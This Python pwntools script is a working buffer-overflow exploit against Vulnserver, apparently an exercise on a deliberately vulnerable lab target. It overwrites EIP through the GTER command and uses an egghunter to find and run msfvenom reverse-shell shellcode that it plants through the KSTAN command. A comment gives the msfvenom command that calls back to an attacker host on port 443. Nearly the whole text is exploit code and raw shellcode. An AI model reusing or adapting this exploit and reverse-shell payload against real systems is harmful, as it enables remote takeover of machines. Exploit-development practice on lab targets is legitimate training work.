from pwn import * # pylint: disable=unused-wildcard-import
context.log_level = 'debug' # pylint: disable=assigning-non-slot

# IP and port of the target (Vulnserver).
ip = "192.168.1.128"
port = 9999

cmd= "GTER "
# cyclic -l 0x6261616F
offset_eip = 156 
eip = 0x625011af # Address of instruction we want to run (Ex. jmp esp).

# Here we put the shellcode we want to execute.
offset_sc1 = offset_eip + 4
sc1 = "\xEB\x9A"

# Here we put our egghunter (TAG="Gsch").
offset_egg = offset_eip - 100
egg = ("\x90"*16 +
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x43\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x47\x73\x63\x68\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

# Here we add our shellcode and prepend the tag so that egghunter finds it.
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.139 LPORT=443 EXITFUNC=thread -f c -b "\x00\x0a"
sc2 = ("GschGsch"
"\xdb\xc4\xd9\x74\x24\xf4\x5a\xb8\x77\xa2\x38\x12\x29\xc9\xb1"
"\x52\x31\x42\x17\x03\x42\x17\x83\x9d\x5e\xda\xe7\x9d\x77\x99"
"\x08\x5d\x88\xfe\x81\xb8\xb9\x3e\xf5\xc9\xea\x8e\x7d\x9f\x06"
"\x64\xd3\x0b\x9c\x08\xfc\x3c\x15\xa6\xda\x73\xa6\x9b\x1f\x12"
"\x24\xe6\x73\xf4\x15\x29\x86\xf5\x52\x54\x6b\xa7\x0b\x12\xde"
"\x57\x3f\x6e\xe3\xdc\x73\x7e\x63\x01\xc3\x81\x42\x94\x5f\xd8"
"\x44\x17\xb3\x50\xcd\x0f\xd0\x5d\x87\xa4\x22\x29\x16\x6c\x7b"
"\xd2\xb5\x51\xb3\x21\xc7\x96\x74\xda\xb2\xee\x86\x67\xc5\x35"
"\xf4\xb3\x40\xad\x5e\x37\xf2\x09\x5e\x94\x65\xda\x6c\x51\xe1"
"\x84\x70\x64\x26\xbf\x8d\xed\xc9\x6f\x04\xb5\xed\xab\x4c\x6d"
"\x8f\xea\x28\xc0\xb0\xec\x92\xbd\x14\x67\x3e\xa9\x24\x2a\x57"
"\x1e\x05\xd4\xa7\x08\x1e\xa7\x95\x97\xb4\x2f\x96\x50\x13\xa8"
"\xd9\x4a\xe3\x26\x24\x75\x14\x6f\xe3\x21\x44\x07\xc2\x49\x0f"
"\xd7\xeb\x9f\x80\x87\x43\x70\x61\x77\x24\x20\x09\x9d\xab\x1f"
"\x29\x9e\x61\x08\xc0\x65\xe2\xf7\xbd\x64\x79\x9f\xbf\x66\x7c"
"\xdb\x49\x80\x14\x0b\x1c\x1b\x81\xb2\x05\xd7\x30\x3a\x90\x92"
"\x73\xb0\x17\x63\x3d\x31\x5d\x77\xaa\xb1\x28\x25\x7d\xcd\x86"
"\x41\xe1\x5c\x4d\x91\x6c\x7d\xda\xc6\x39\xb3\x13\x82\xd7\xea"
"\x8d\xb0\x25\x6a\xf5\x70\xf2\x4f\xf8\x79\x77\xeb\xde\x69\x41"
"\xf4\x5a\xdd\x1d\xa3\x34\x8b\xdb\x1d\xf7\x65\xb2\xf2\x51\xe1"
"\x43\x39\x62\x77\x4c\x14\x14\x97\xfd\xc1\x61\xa8\x32\x86\x65"
"\xd1\x2e\x36\x89\x08\xeb\x56\x68\x98\x06\xff\x35\x49\xab\x62"
"\xc6\xa4\xe8\x9a\x45\x4c\x91\x58\x55\x25\x94\x25\xd1\xd6\xe4"
"\x36\xb4\xd8\x5b\x36\x9d")

# Create our payload.
payload = fit({
    0:cmd,
    offset_egg:egg,
    offset_eip:eip,
    offset_sc1:sc1,
    },length=200)

# Important to use different sockets because socket re-use truncated our shellcode
io1 = remote(ip,port)
io1.readline()
io1.sendline("KSTAN "+ sc2)
io1.close()

io2 = remote(ip,port)
io2.readline()
io2.sendline(payload)